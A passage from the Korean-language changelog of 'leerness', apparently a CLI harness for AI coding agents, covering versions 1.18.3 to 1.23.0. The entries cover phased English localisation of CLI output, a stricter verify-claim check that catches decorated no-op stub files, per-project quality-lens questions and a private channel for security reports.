- **🌐 session close 마감 보고 영어화 (Phase 4)**: 항상-표시되는 마감 라인 — 완료 정직성/마감 보안 advisory, `활성 룰 없음`→`no active rules`, Required final response sections, `🔚 자동 통합 보고`→`integrated report`(사용자 요청·pre-wake·멱등성·셸 실패 포함). DI 로 `uiLang` 주입.
- **🌐 session close --suggest/진행요약/cleanup 영어화 (Phase 5)**: 다음 라운드 추천(skill 후보·`drift 상태`→`drift status`·`가장 많이 쓴 명령`→`Most-used commands`·MCP/skill-query 통계), `진행 요약`→`Progress summary`(archive·마일스톤·회고·워크스페이스), 운영 자동정리(release cleanup·인코딩 BOM).
- **가벼움 정리**: MCP 통계 줄의 `t` 헬퍼 셰도잉(`.map(([t,n])…)` → `[tool,n]`) 제거.
- **한국어 우선 기본 보존**: 영어는 명시 opt-in(`--language en`/`LEERNESS_LANG=en`/en init 프로젝트). 플래그 없으면 한국어 — e2e 무회귀로 검증.

### 잔여 (UR-0010 Phase 6+, 백로그)
- session-handoff.md / current-state.md 본문(파일에 기록되는 한국어 메모리 아티팩트) + help + status + 그 외 명령 본문 — 단계적 확대.

### 검증 (회귀 0)
- **selftest 240/240** (Phase 4·5 영어/한국어 보존 소스가드 포함) · 행위(en: `integrated report / Next-round suggestions / Progress summary`, ko 기본: `자동 통합 보고 / 다음 라운드 추천 / 진행 요약`) · **E2E 365/365**.
- minor(1.23.0) — npm 배포(R-0011 stable) + annotated tag(Stable) + GitHub release(latest) + 게시본 클린룸 재실증.

## 1.22.2 — 2026-06-15 — CLI 영어화 Phase 5: session close --suggest/진행요약/cleanup 영어화 (UR-0010)

**🌐 마감 보고의 나머지 절반까지 영어로.** Phase 4 가 "항상 표시되는" 마감 라인을 영어화했다면, Phase 5 는 **다음 라운드 추천(`--suggest`)·진행 요약·운영 자동정리** 출력을 영어 opt-in 으로 — 마감 화면 전체가 언어 선택을 따른다.

### 변경 (UR-0010 Phase 5)
- **`--suggest` 다음 라운드 추천 영어화**: `다음 라운드 추천`→`Next-round suggestions`, 신규 skill 후보, `drift 상태`→`drift status`, `가장 많이 쓴 명령`→`Most-used commands`, MCP 호출/드문 호출, skill match query 누적 — 전부 `t(ko,en)` 분기.
- **진행 요약 영어화**: `진행 요약`→`Progress summary`, archive 누적, N세션 마일스톤/자동 회고, 워크스페이스 안내, retro 요약 실패 메시지.
- **운영 자동정리 영어화**: release/* 정리(`--auto-cleanup-branches`), 셸 스크립트 인코딩 위험 자동 BOM(`--auto-fix-encoding`) 안내.
- **가벼움 정리**: MCP 통계 줄에서 `t` 헬퍼와 충돌하던 `.map(([t, n]) => …)` 지역 변수를 `tool` 로 rename — 셰도잉 제거(가독성).
- **한국어 기본 유지**: 영어는 `--language en`/`LEERNESS_LANG=en`/en init 프로젝트에서만. 플래그 없으면 한국어(ko 원문은 `t()` ko 인자로 보존).

### 잔여 (UR-0010 Phase 6+, 백로그)
- session-handoff.md / current-state.md 본문(파일에 기록되는 한국어 메모리 아티팩트) + help + status + 그 외 명령 본문 — 단계적 확대.

### 검증 (회귀 0)
- **selftest 239→240** (Phase 5 영어/한국어 보존 + 셰도잉 제거 소스가드) · 행위(en: `Next-round suggestions / drift status / Most-used commands / Progress summary`, ko 기본: `다음 라운드 추천 / drift 상태 / 가장 많이 쓴 명령 / 진행 요약`) · **E2E 365/365**.
- patch(1.22.2) — npm 미배포(R-0011, GitHub/CHANGELOG 누적).

## 1.22.1 — 2026-06-15 — CLI 영어화 Phase 4: session close 마감 보고 영어화 (UR-0010)

**🌐 세션을 마칠 때 보는 마지막 출력을 영어로.** init 배너(P1)→handoff 헤드라인(P2)→verify-claim(P3)에 이어 **session close 의 항상-표시 마감 보고**를 영어 opt-in 으로 — 핵심 세션 라이프사이클(시작→작업→검증→마감)이 영어로 일관.

### 변경 (UR-0010 Phase 4)
- **session close 마감 보고 영어화 (DI uiLang 주입)**: `_uiLang(root)` 를 session-close DI deps 로 주입 후 항상-표시 라인 `t(ko,en)` 분기 — 완료 정직성/마감 보안 advisory, `활성 룰 없음`→`no active rules`, Required final response sections 목록, `🔚 자동 통합 보고`→`integrated report`(사용자 요청/pre-wake/멱등성/셸 실패 결과 포함). 한국어 기본 유지(영어 명시 opt-in).
- **한국어 무회귀**: e2e 는 `--language` 없이 ko 로 실행 → 마감 보고 한국어 유지(검증). ko 원문은 `t()` ko 인자로 보존.

### 잔여 (UR-0010 Phase 5+, 백로그)
- session close `--suggest` 상세(skill 후보·drift·MCP/skill-query 통계·진행 요약) + help + status + 그 외 명령 본문 — 단계적 확대.

### 검증 (회귀 0)
- **selftest 238→239** (session close uiLang 주입 + 영어/한국어 보존 소스가드) · 행위(en: `integrated report / no active rules / no user requests`, ko 기본: `자동 통합 보고 / 활성 룰 없음`) · **E2E 365/365**.
- patch(1.22.1) — npm 미배포(R-0011, GitHub/CHANGELOG 누적).

## 1.22.0 — 2026-06-15 — 🛡️ [안정화/Stable] 확장된 영어 지원(헤드라인 + verify-claim) 안정 minor

**🛡️ 안정화(Stable) minor — 영어 CLI 커버리지를 핵심 검증 흐름까지 확장해 npm 공개.** 직전 minor(1.21.0) 이후 누적된 패치 2건(1.21.1~1.21.2)을 검증·통합해 배포. R-0011 정책의 13번째 stable minor. 영어 opt-in 표면이 첫 화면(1.21.0)에서 **handoff 헤드라인 + verify-claim 플래그십**까지 확장 — 한국어 우선 기본은 그대로.

### 이번 minor 통합 (1.21.1~1.21.2)
- **🌐 handoff 헤드라인 항목 라벨 영어화 (Phase 2)**: 매 세션 가장 많이 보는 출력 — `--language en` 시 `📊 Headline: drift healthy · security OK · N skills · health · mem …` 완전 영어. 보안/시크릿/미답요청/비정상종료/플랫폼제약 등 전 항목.
- **🌐 verify-claim 출력 영어화 (Phase 3, 플래그십)**: 완료 검증 시 보는 핵심 출력 ~30 문자열 영어화 — File check / Test count / Summary / implementation substance / test-impl link / git diff cross-check / optimism+honesty / final verdict.
- **한국어 우선 기본 보존**: 영어는 명시 opt-in(`--language en`/`LEERNESS_LANG=en`/en init 프로젝트). 플래그 없으면 한국어 — e2e 무회귀로 검증.

### 잔여 (UR-0010 Phase 4+, 백로그)
- session close 마감 보고(~117 문자열) + help + status — 단계적 확대.

### 검증 (회귀 0)
- **selftest 236→238** · **E2E 365/365** · en/ko 헤드라인·verify-claim 행위 + 게시본 재실증.

### 안정화 표시 (R-0006)
CHANGELOG [안정화/Stable] · git tag (Stable) · GitHub release (`--latest`) · npm dist-tag `stable` 시도.

## 1.21.2 — 2026-06-15 — CLI 영어화 Phase 3: verify-claim(플래그십) 출력 영어화 (UR-0010)

**🌐 플래그십 명령 출력을 영어로.** 사용자가 "완료됐나?"를 확인할 때 보는 `verify-claim` 의 human 출력 전체를 영어 opt-in 으로 — 온보딩 다음으로 영향 큰 표면. 한국어 기본 유지(영어 명시 opt-in).

### 변경 (UR-0010 Phase 3)
- **verify-claim 출력 영어화**: human 렌더(–json 제외) 시작에서 `_uiLang(root)` 1회 해석 후 전 출력을 `t(ko,en)` 분기 — `📂 파일 검증`→`File check`, `🧪 테스트 카운트`→`Test count`, `🚦 실행`→`run`, `종합`→`Summary`, `파일 모두 존재`→`all files exist`, `구현 실체`→`implementation substance`, `테스트-구현 연결`→`test-impl link`, `git diff 교차검증`→`git diff cross-check`, `낙관적 표시+정직성`→`optimism+honesty`, evidence 완전성/외과적 변경/한계/최종 판정까지 ~30 문자열. 품질 렌즈 advisory 헤더도 영어.
- **한국어 기본 무회귀**: e2e 는 `--language` 없이 실행되며 init 이 이 환경에서 manifest.language=`ko` 로 저장(검증함) → verify-claim 기본 출력 한국어 유지. ko 원문은 `t()` 의 ko 인자로 소스에 보존.

### 잔여 (UR-0010 Phase 4+, 백로그)
- session close 마감 보고 + help + status + 그 외 명령 본문 영어화 — 단계적 확대.

### 검증 (회귀 0)
- **selftest 237→238** (verify-claim t() 경유 + 한국어 보존 소스가드) · 행위(en: `## Summary / all files exist / evidence claim matches`, ko 기본: `## 종합 / 파일 모두 존재`) · **E2E 365/365**.
- patch(1.21.2) — npm 미배포(R-0011, GitHub/CHANGELOG 누적).

## 1.21.1 — 2026-06-15 — CLI 영어화 Phase 2: handoff 헤드라인 항목 라벨 영어화 (UR-0010)

**🌐 매 세션 가장 많이 보는 출력(handoff 헤드라인)을 영어로 완성.** Phase 1(배너 + 헤드라인 프리픽스)에 이어, 헤드라인의 **항목 라벨 전체**를 영어 opt-in 으로. 비한국어 사용자가 세션마다 보던 한국어 토막들(보안 OK·미답 요청·비정상종료·플랫폼 제약 등)이 사라짐.

### 변경 (UR-0010 Phase 2)
- **handoff 헤드라인 항목 라벨 영어화**: 블록 1회 `_uiLang(root)` 해석 후 각 항목을 `t(ko,en)` 분기 — `🔒 보안 OK`→`security OK`, `🚨 시크릿 N건`→`N secret(s)`, `🚨 .env 미무시`→`.env not ignored`, `🔌 MCP N회`→`MCP Nx`, `📒 skill query N회`, `🪄 slash 24h N회`, `📥 미답 요청 N건`→`N unanswered request(s)`, `📥 요청 N (tracked)`, `📥 자동완료가능 N건`→`N auto-completable`, `🔌 비정상종료`→`abnormal-exit`, `🚦 N 플랫폼 제약`→`N platform constraint(s)`, `R N남음`→`N left`. **한국어 기본 유지**(영어 opt-in).
- 행위 확인: en → `📊 Headline: drift healthy · 🔒 security OK · 📚 N skills · ⚕ health: ✓ · 🧠 mem …` 완전 영어 / 플래그 없음 → `📊 헤드라인`(한국어).

### 잔여 (UR-0010 Phase 3+, 백로그)
- session close 마감 보고 + verify-claim 출력 + help + status 등 명령 본문 영어화 — 단계적 확대.

### 검증 (회귀 0)
- **selftest 236→237** (헤드라인 t() 경유 소스가드) · 행위(en 헤드라인 완전 영어 + ko 기본) · **E2E 365/365**.
- patch(1.21.1) — npm 미배포(R-0011, GitHub/CHANGELOG 누적).

## 1.21.0 — 2026-06-15 — 🛡️ [안정화/Stable] 영어 온보딩 첫걸음 + 검증 강화 안정 minor

**🛡️ 안정화(Stable) minor — 비한국어 사용자에게 영어 온보딩을 실제로 전달.** 직전 minor(1.20.0) 이후 누적된 패치 2건(1.20.1~1.20.2)을 검증·통합해 npm 공개. R-0011 정책의 12번째 stable minor. 핵심: **영어 첫 화면(opt-in)** 이 npm 사용자에게 닿고, 검증 플래그십의 정적 우회가 닫힘.

### 이번 minor 통합 (1.20.1~1.20.2)
- **🌐 CLI 영어화 Phase 1 (UR-0010, 사용자 지정 방향)**: 영어 README 정문 ↔ 한국어 CLI 불일치(외부평가 #1 병목) 해소 시작. `--language en` / `LEERNESS_LANG=en` / en 으로 init 된 프로젝트에서 **init 시작하기 배너 전체 + handoff 헤드라인 라벨**이 영어로. 한국어 우선 정체성은 **기본값 유지**(영어는 명시 opt-in, system locale 미사용). 순수 `_uiLang`/`_tx`.
- **🛡️ 장식 no-op 정적 우회 차단 (검증)**: `"use strict"; module.exports={}` · `{}; //c` · `void 0;` · `;;;;` · `0;` 같은 "실로직 0" 파일이 정적 verify-claim 을 통과하던 우회를 차감식 residue 검사로 폐쇄(FP 0).
- **📄 README 플래그십 데모 정합**: task-id(T-0002) + "실파일 쓰면 같은 명령 통과" 정정 — 신규 유저 복붙이 실제로 동작. lens 헤더 동적 버전.
- **🔬 신뢰 투명성/렌즈 완전판** (1.19.x 누적 — 1.20.0 에 포함됨, 본 minor 는 1.20.x 패치 묶음).

### 잔여 (UR-0010 Phase 2+, 백로그)
- handoff 헤드라인 **항목 라벨**(drift·보안·skills·health·mem 등 ~20종) + session close·verify-claim·help·status 출력 영어화 — 단계적 확대.

### 검증 (회귀 0)
- **selftest 235→236** · **E2E 365/365** · 영어 배너/헤드라인 행위 + no-op 우회 차단 + 게시본 재실증.

### 안정화 표시 (R-0006)
CHANGELOG [안정화/Stable] · git tag (Stable) · GitHub release (`--latest`) · npm dist-tag `stable` 시도.

## 1.20.2 — 2026-06-15 — CLI 영어화 Phase 1: 첫 화면(init 배너·handoff 헤드라인) 영어 opt-in (UR-0010)

**🌐 "어떤 언어, 어떤 AI 에이전트로 작업하든"의 실질 첫걸음.** 외부평가가 꼽은 단일 최대 병목 — 영어 README 정문 ↔ 한국어 CLI 불일치 — 를 단계적으로 해소 시작. 한국어 우선 정체성은 기본값으로 유지하고, **영어는 명시 opt-in**.

### 변경 (UR-0010 Phase 1)
- **UI 언어 해석 `_uiLang(root)`**: 우선순위 `--language` 플래그 > `LEERNESS_LANG` env > `.harness/manifest.json` 의 language(init 선택) > **`ko`(기본)**. system locale 은 의도적으로 미사용(영어 OS 한국 사용자 놀람 방지) — 영어는 항상 명시 opt-in.
- **init 시작하기 배너 영어화**: `--language en`(또는 LEERNESS_LANG=en, 또는 en 으로 init 된 프로젝트)에서 "Get started (3 steps)" + 메모리/인과/보안/MCP/release 섹션 전체 영어로. 비한국어 신규 유저의 첫 화면이 더 이상 한국어 벽이 아님.
- **handoff 헤드라인 라벨 영어화**: `📊 헤드라인 (버전태그…)` → 영어 시 `📊 Headline`(버전태그 노이즈 제거).
- 순수 함수 `_uiLang`/`_tx` 분리(단위 테스트). **한국어 기본 회귀 0**(플래그/env/manifest 없으면 그대로 한국어).

### 잔여 (UR-0010 Phase 2+, 백로그)
- handoff 헤드라인 **항목 라벨**(보안 OK·skills·health…) 영어화, 그 외 명령(session close·verify-claim 출력·help·status 등) 영어화 — 단계적 확대. Phase 1 은 첫인상 표면(배너+헤드라인 프리픽스)에 한정.

### 검증 (회귀 0)
- **selftest 235→236** (`_uiLang` 해석 4종 + `_tx` + 첫화면 분기 소스가드) · 행위: `--language en` → 영어 배너/헤드라인, 플래그 없음 → 한국어 유지 · **E2E 365/365**.
- patch(1.20.2) — npm 미배포(R-0011, GitHub/CHANGELOG 누적).

## 1.20.1 — 2026-06-15 — 1.20.0 외부평가 채택: 장식 no-op 우회 차단 + README 데모 정합

**🔎 게시본 1.20.0 신규 멀티모델 클린룸 평가(5축) 채택 — 맹신 X로 재현된 것만.** 검증(8)·정직성/보안(9)·품질렌즈(8)는 GPT-5.5 대비 뚜렷이 상승했고, 평가가 찾은 재현 가능한 P2 두 가지(검증 정적모드 우회 + README 데모 부정확)를 닫음.

### 변경 (1.20.0 외부평가 재현 채택)
- **🛡️ 장식된 no-op 정적 우회 차단 (검증, P2)**: 빈껍데기 검출이 순수 빈-export 형태만 잡던 것 — `"use strict"; module.exports={}`·`{}; // comment`·`module.exports={}; void 0;`·`;;;;`·`0;` 같은 "실로직 0" 파일이 정적 `verify-claim`을 exit 0 통과하던 우회 폐쇄. `_vcImplIsEmpty` 에 **차감식(residue) 검사** 추가 — 디렉티브 프롤로그 + 빈 export + no-op 리터럴/문을 제거하고 의미 토큰이 하나도 안 남으면 스텁. FP 0(실코드·`require` 재노출·이름붙은 export·`module.exports=0` 같은 의도적 값은 통과). `let x=1` 류 무의미 선언은 식별자가 남아 통과 — AST 토큰화 필요(백로그).
- **📄 README 플래그십 데모 정합 (온보딩, P2)**: ① task-id 수정 — init 이 T-0001(계획 task)을 차지하므로 `task add` 는 T-0002 생성, 데모를 실제 흐름(출력된 id 사용)으로. ② "실파일+실테스트 쓰면 같은 명령 통과" 정정 — evidence 의 테스트 개수 주장은 실측과 대조되므로(거짓이면 거부) 정직한 evidence + `--run-tests --test-cmd` 안내로 교체. 신규 유저 복붙이 실제로 동작.
- **🔖 lens 헤더 버전 정합 (P3)**: 하드코딩 `(1.18.3)` → 동적 `(v${VERSION})`.

### 백로그 등록 (평가 추천 우선순위, 이번 라운드 미포함)
- **UR-0010 (최우선)**: CLI UX 영어화 — `--language en` 이 템플릿 파일만 바꾸고 CLI 자체 출력(init 배너·handoff 헤드라인·help)은 한국어 유지. 영어 README 정문 ↔ 한국어 CLI 불일치가 비한국어 시장의 단일 최대 병목(거대 작업, UR-0042 잔여 통합).
- **UR-0011**: 표면 core-vs-extended 티어링 — 84커맨드+85툴 평면 노출, banner/about/commands/help 의 "start here" 4종 불일치 → 핵심8 표준화 + `--help` 정리.
- **UR-0012**: secret scan AWS AKIA 키 ID + 추가 prefix 커버리지.

### 검증 (회귀 0)
- **selftest 235** (no-op 우회 6종 차단 + FP 가드 3종 행위) · 5종 우회 재현 차단·FP 0 확인 · README 데모 재현(task-id·count 정합) · **E2E 365/365**.
- patch(1.20.1) — npm 미배포(R-0011, GitHub/CHANGELOG 누적).

## 1.20.0 — 2026-06-15 — 🛡️ [안정화/Stable] 품질 렌즈 완전판 + 신뢰 투명성 안정 minor

**🛡️ 안정화(Stable) minor — "AI가 스스로 질문하고 행동하도록" 완성.** 직전 minor(1.19.0) 이후 누적된 패치 3건(1.19.1~1.19.3)을 검증·통합해 npm 공개. R-0011 정책의 11번째 stable minor. 핵심 테마: **사용자 자기질문 품질 렌즈를 정적 명령에서 완전한 워크플로 기능으로** + 신뢰 투명성(클린룸 평가 공개).

### 이번 minor 통합 (1.19.1~1.19.3)
- **🧭 품질 렌즈 완전판 (UR-0003, 사용자 핵심 철학)**: 1.18.3 의 정적 `lens` 명령을 3단계로 완성 —
  - **v2 (1.19.2)**: `verify-claim` 이 완료를 검증하는 바로 그 순간, 주장된 파일 확장자로 관련 렌즈 질문을 advisory 로 노출(결정적 매핑, 게이트 아님). 코드: "선임 개발자가 복잡하다 느끼지 않을까?" / 디자인: "이쁘고 직관적인가?".
  - **v3 (1.19.3)**: 프로젝트별 커스텀 렌즈 `.harness/quality-lenses.json` — 게임은 "60fps 끊김?", 웹은 접근성을 자기 기준에 추가. 내장+커스텀 불변 병합(읽기만, 쓰기 명령 없음).
  - lens 도메인 대소문자/공백 정규화(1.19.1).
- **🔬 신뢰 투명성 (GPT-5.5 #5, UR-0009, 1.19.1)**: `docs/clean-room-evaluations.md` 공개 — README "독립 클린룸 평가" 주장을 확인 가능하게(방법론·4개 평가·**정직한 한계**). 과대였던 "5개" 수치를 검증 가능한 서술로 교체.
- **🛡️ 19th 버그헌트 (1.19.1)**: 1.18.x 신규 표면(권한 술어·빈껍데기 정규식·lens·audit) 엣지 14종 + 크래시 벡터 — 견고 확인(버그 0, lens 정규화만 수정).

### 검증 (회귀 0)
- **selftest 231→235** · **E2E 365/365** · 렌즈 v2/v3 행위 재현 + 클린룸 문서 + 게시본 재실증.

### 안정화 표시 (R-0006)
CHANGELOG [안정화/Stable] · git tag (Stable) · GitHub release (`--latest`) · npm dist-tag `stable` 시도.

## 1.19.3 — 2026-06-14 — 품질 렌즈 완전판 v3: 프로젝트별 커스텀 렌즈 (UR-0003)

**🧭 렌즈를 "프로젝트 인지"로.** 내장 5종(code/design/docs/test/security)에 더해, 프로젝트가 자기 품질 기준을 추가할 수 있습니다 — 게임 프로젝트는 "60fps에서 끊기지 않나?", 웹 프로젝트는 접근성("키보드만으로 모든 기능 가능?")을 자기질문에 넣습니다. 사용자의 "각 분야 고려" 철학을 프로젝트 맥락까지 확장.

### 변경 (UR-0003 렌즈 완전판 v3)
- **프로젝트 커스텀 렌즈**: `.harness/quality-lenses.json` 을 `lens` 와 verify-claim advisory 가 내장 catalog 와 **병합**. 포맷 `{ "domains": { "code": { "questions": ["..."] }, "a11y": { "title":"접근성", "persona":"...", "questions":[...] } } }`. 기존 도메인 → 질문 추가(dedup, 최대 8), 신규 도메인 → 추가. 표시에 `[프로젝트]`/`[+프로젝트 질문]` 라벨.
- **읽기-병합만, 쓰기 명령 없음 (R-0006 보수)**: leerness 는 JSON 을 읽어 병합·표시만 함(쓰기 경로 위험 0). JSON 은 AI/사용자가 편집 — 커스텀 없으면 편집 방법을 `lens` 가 안내. 순수 함수 `_mergeLensCatalog`(불변, 내장 catalog 미오염) + `_loadProjectLenses`.
- 잔여(UR-0003 완전판): handoff 힌트, MCP 노출, 인과관계 자동 추론 — 백로그.

### 검증 (회귀 0)
- **selftest 234→235** (병합 행위: 기존 도메인 질문 추가·신규 도메인·잘못된 입력 무시·내장 불변성) · 프로젝트 커스텀 렌즈 행위 재현(게임 fps + a11y 도메인 병합 표시) · **E2E 365/365**.
- patch(1.19.3) — npm 미배포(R-0011, GitHub/CHANGELOG 누적).

## 1.19.2 — 2026-06-14 — 품질 렌즈 완전판 v2: verify-claim 완료-검증 순간에 분야별 자기질문 (UR-0003)

**🧭 렌즈를 "수동 참조 명령"에서 "완료 검증 흐름의 일부"로.** 1.18.3 의 `leerness lens` 는 AI 가 직접 호출해야만 보였습니다. 이제 `verify-claim` 이 **완료를 검증하는 바로 그 순간**(사용자 표현: "완료 선언 전 자기질문") 주장된 파일의 종류에 맞는 렌즈 질문을 advisory 로 노출 — AI 의 자기질문이 수동 습관이 아니라 워크플로의 일부가 됩니다.

### 변경 (UR-0003 렌즈 완전판 v2)
- **verify-claim 렌즈 advisory**: done 주장 검증 시, 주장된 파일 확장자로 관련 렌즈 도메인을 **결정적으로** 판정(`_lensDomainsForFiles` — 퍼지 키워드 추론 아님)해 해당 분야 질문을 노출. 예: `pay.js + app.css` → `code`(선임 개발자가 복잡하다 느끼지 않을까?) + `design`(이쁘고 직관적인가?). 매핑: UI/스타일(css/scss/tsx/jsx/vue/html)→design, 문서(md/mdx/rst)→docs, 테스트파일→test, 실코드(js/ts/py/…)→code. 최대 2개(클러터 방지), 고정 순서(code 먼저).
- **advisory 전용** — 게이트가 아님(exit code 불변). 기계검증(파일/테스트/스텁)을 통과해도 "사람이 보기에 좋은가"는 별개라는 점을 완료 순간에 상기. `--json` 경로엔 영향 없음(human 출력 한정).
- 잔여(UR-0003 완전판): 프로젝트별 커스텀 렌즈(`.harness/quality-lenses.json`), handoff 힌트, MCP 노출, 인과관계 자동 추론 — 백로그.

### 검증 (회귀 0)
- **selftest 233→234** (`_lensDomainsForFiles` 행위: 단일/혼합/문서/테스트/빈/최대2 매핑) · verify-claim advisory 행위 재현(혼합 파일 → code+design) · **E2E 365/365**.
- patch(1.19.2) — npm 미배포(R-0011, GitHub/CHANGELOG 누적).

## 1.19.1 — 2026-06-14 — 19th 버그헌트(신규 표면 견고 확인) + 클린룸 평가 공개 (GPT-5.5 #5)

**🔬 갓 배포한 1.19.0의 신규 표면을 적대적으로 헌트 — 표면은 견고, 사소 1건만 수정 + 신뢰증거 공개.** 1.18.x 추가분(권한 술어·빈껍데기 정규식·lens·audit)을 엣지케이스로 직접 탐침: 순수 술어 14종 + CLI 크래시/주입 벡터 — **크래시·스택트레이스·오판 0**. 유일 발견은 `lens` 도메인 대소문자 미정규화.

### 변경
- **🧭 lens 도메인 정규화 (19th 헌트)**: `leerness lens Code` / `lens  CODE ` 도 인식(trim + toLowerCase). 이전엔 정확한 소문자만 허용해 사소한 오류.
- **🔬 클린룸 평가 공개 (GPT-5.5 #5, UR-0009)**: `docs/clean-room-evaluations.md` 신설 — README 의 "독립 클린룸 평가로 검증" 주장을 **확인 가능하게**. 방법론(게시본 npm 설치·행위 검증·적대 시도), 수행한 4개 평가(5축 현장조사·1.18.0/1.19.0 게시본 재실증·1.18.2 적대 스텁 워크플로), 그리고 **정직한 한계**(휴리스틱이지 의미검증 아님 / 커버리지·mutation·제3자 재현은 미해결)를 명시. README(영/한)에서 링크. 과대홍보였던 "5개" 수치를 검증 가능한 서술로 교체.
- 잔여(UR-0009): 코드 커버리지/mutation testing 은 spawn 기반 e2e 특성상 별도 작업으로 백로그.

### 검증 (회귀 0)
- **selftest 231→233** (lens 정규화 + 클린룸 문서 행위 가드) · 순수 술어 14종 엣지 통과 · 크래시 벡터 0 · **E2E 365/365**.
- patch(1.19.1) — npm 미배포(R-0011, GitHub/CHANGELOG 누적).

## 1.19.0 — 2026-06-14 — 🛡️ [안정화/Stable] 검증 하네스 강화 + 정직한 프레이밍 안정 minor

**🛡️ 안정화(Stable) minor — "거짓 완료를 못 하게" 만드는 검증 계층을 한층 더 단단하게.** 직전 minor(1.18.0) 이후 누적된 패치 4건(1.18.1~1.18.4)을 검증·통합해 npm 공개. R-0011 정책의 10번째 stable minor. 핵심 테마: **검증 계층 강화(비-JS 거짓FAIL 해소 + 위장 스텁 차단) + AI 자기질문 품질 렌즈 + 정직한 프레이밍(협조 vs 강제, 영문 우선)**.

### 이번 minor 통합 (1.18.1~1.18.4)
- **🌐 비-JS `--test-cmd` 거짓 FAIL 해소 (P1, 1.18.1)**: 기본 권한(basic)이 `python/pytest` 등 사용자 명시 테스트 명령을 막아(exit 126) 초록 프로젝트를 "주장 불일치 FAIL"로 오판하던 것 — 명시 `--test-cmd`/config `testCommand`는 명시 권한으로 실행 허용(cwd jail 유지), 차단 시엔 FAIL 아닌 skip. + task update 위치인자 status 무시 차단 + 종합 라벨 정직화.
- **🛡️ 위장 스텁 차단 (P2, 1.18.2)**: `module.exports = {}` 같은 빈 export 껍데기가 "구현 실체 ✓"를 통과하던 우회 폐쇄. 적대 워크플로로 한-단어 우회 9종(Object.freeze/new Object/async fn/exports.default/인라인 주석/`()=>({})`/class{}) 재발견·차단. 과탐 0(이름붙은 export·재노출·실코드 통과). `.java/.php/.mjs/.cjs` 추출 정합.
- **🧭 분야별 자기질문 품질 렌즈 (1.18.3)**: `leerness lens [code|design|docs|test|security]` — 완료 선언 전 AI가 스스로 답하는 질문(코드: "선임 개발자가 복잡하다 느끼지 않을까?" / 디자인: "선임 디자이너+일반 사용자가 이쁘고 직관적인가?") + 분야간 인과관계. AGENTS.md/anti-lazy 정책 통합. README 영문 우선 재작성(README.ko.md 분리) + 설치 직후 REPL 문항 제거.
- **🔒 보안 제보 비공개화 + 자기정합 (1.18.4)**: SECURITY.md를 GitHub Private Vulnerability Reporting + 보안 이메일로(공개 이슈 안내 모순 해소). README 관리블록 버전 자기정합 + audit가 동적 배지 README의 관리블록 lag도 감지. README "Guidance vs enforcement"(협조형 기본, `ci init`+branch protection으로 강제) + `init --minimal` 노출.

### 검증 (회귀 0)
- **selftest 222→231** · **E2E 365/365** · 각 패치 행위 재현(공격 차단 + 정직 작업 과탐 0) + 위장 스텁 적대 워크플로 + 게시본 재실증(1.18.1 P1) 완료.

### 안정화 표시 (R-0006)
CHANGELOG [안정화/Stable] · git tag (Stable) · GitHub release (`--latest`) · npm dist-tag `stable` 시도.

## 1.18.4 — 2026-06-14 — GPT-5.5 외부평가 채택: 보안 제보 비공개화 + 자기정합 + 정직한 강제 프레이밍

**🔎 외부평가(GPT-5.5)를 맹신 X로 검증해 진짜 결함만 채택.** 8개 한계 지적을 리포지토리에서 직접 확인 — #3(오케스트레이션 과대홍보)은 현 포지셔닝상 **기각**(이미 "operations/verification layer"), #6(채택 증거)은 범위 밖. 검증된 결함을 이번 패치에 반영.

### 변경 (채택)
- **🔒 SECURITY.md 비공개 제보 채널 (#8, P1, UR-0005)**: "비공개로 알려주세요" 하면서 **공개** GitHub Issues+보안라벨로 안내하던 모순 해소(공개 이슈는 모두에게 노출). → **GitHub Private Vulnerability Reporting**(`/security/advisories/new`) + 보안 이메일(`[leerness security]`)로 교체, "공개 이슈 금지" 명시 + 책임 있는 공개 안내. 권한 큰 하네스의 기본 위생.
- **🪞 README 자기정합 (#7, P2, UR-0006)**: 관리블록 버전이 package.json(1.18.x)과 어긋나던 것(v1.18.0 표기) 해소 — `readme sync` 로 1.18.4 재스탬프. 게다가 audit 이 **동적 npm 배지 README 에서 못 잡던 갭**을 닫음: 배지뿐 아니라 "Last synced by Leerness vX" 관리블록 버전도 package.json 과 대조(`readme_synced_version_stale`, `--fix` 자동). 정합성 관리 도구가 자기 정합부터.
- **🛡️ 정직한 강제 프레이밍 (#2, P2, UR-0007)**: README 에 "Guidance vs enforcement" 섹션 — leerness 는 **기본 협조형**(에이전트가 자발 실행)이며, **강제**하려면 `leerness ci init`(PR 게이트 워크플로) + branch protection required check 로 검증 건너뛴 PR 머지 차단. 가이드라인과 가드레일의 차이를 솔직히 명시.
- **🪶 가벼운 진입 (#4, P2, UR-0008)**: README 30초 퀵스타트에 `init --minimal`(핵심 메모리+검증 파일만) 노출 — 사용자 "가볍게" 철학과 정합. 핵심8 vs 플러그인 경계 분리는 백로그.
- 백로그(UR-0009): 클린룸 평가 요약 공개 + 커버리지 측정.

### 검증 (회귀 0)
- **selftest 229→231** (SECURITY.md 비공개 채널 행위 + audit 관리블록 lag 소스 가드) · audit 행위 재현(인위적 stale → 감지+`--fix`) · **E2E 365/365**.
- patch(1.18.4) — npm 미배포(R-0011, GitHub/CHANGELOG 누적).

## 1.18.3 — 2026-06-12 — 품질 렌즈(분야별 자기질문) + README 영문 우선 + 설치 REPL 문항 제거 (사용자 명시 3종)

**🧭 "AI가 스스로 질문하고 행동하도록".** 사용자 명시 지시 3종을 한 패치로: (1) 분야별 자기질문 품질 렌즈, (2) README 영어권 우선 재작성, (3) 설치 직후 REPL 진입 문항 제거.

### 변경
- **`leerness lens [code|design|docs|test|security]` 신설 (UR-0003)**: 완료 선언 전 AI가 스스로 답하는 분야별 질문 + **분야간 인과관계**(↔ affects). 사용자 원문 그대로 — 코드: *"선임 개발자가 이 코드를 보고 복잡하다고 느끼지 않을까?"* / 디자인: *"선임 디자이너와 일반 사용자가 봤을 때 이쁘고 편하고 직관적이며 헷갈리지 않는가?"* / 문서: *"30초 안에 뭘 해보면 되지?"*. "그렇다(통과)"라고 답할 수 없으면 완료가 아님. `--json` 지원. AGENTS.md 템플릿 Required behavior + anti-lazy-work-policy 규칙 7로 통합(새 init 워크스페이스부터 AI가 자동으로 읽음).
- **README 영어권 우선 재작성 (UR-0004)**: 첫 화면 영문 — *Try it in 30 seconds*(즉시 해볼 명령) / *No terminal? Let your AI run it*(비개발자: AI에게 붙여넣는 한 문단 + MCP 85 도구) / *Why leerness?*(자체 하네스 대비 차별점 표 — "기억은 말한 것, leerness는 한 것을 검증"). 한국어 전문은 `README.ko.md` 분리. 관리 블록(project-readme) 보존.
